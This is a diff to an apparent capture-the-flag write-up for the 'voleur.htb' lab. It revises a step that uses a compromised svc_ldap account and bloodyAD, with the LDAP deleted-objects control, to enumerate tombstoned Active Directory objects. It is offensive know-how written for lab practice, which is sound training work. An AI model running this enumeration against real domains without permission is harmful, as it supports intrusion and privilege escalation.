@@ -80,7 +80,7 @@
 
 ![image](https://github.com/user-attachments/assets/f0804929-bd52-43f2-b9b3-a7128bff4132)
 
-12. Looking at BloodHound, svc_ldap user is part of the RESTORE_USERS group. Use svc_ldap to get TGT and enumerate deleted objects via bloodyAD
+12. Looking at BloodHound, svc_ldap user is part of the RESTORE_USERS group. Use svc_ldap to get TGT and enumerate deleted objects via bloodyAD. Use the special -c flag with LDAP OID control 1.2.840.113556.1.4.2064 to show deleted, tombstoned, and recycled objects.  
 
 `bloodyAD -u svc_ldap -d voleur.htb -p '[PASSWORD]' --host dc.voleur.htb --dc-ip 10.129.16.120 -k get search -c 1.2.840.113556.1.4.2064 --resolve-sd --base 'CN=Deleted Objects,DC=voleur,DC=htb' --filter "(objectClass=*)" --attr sAMAccountName`
 
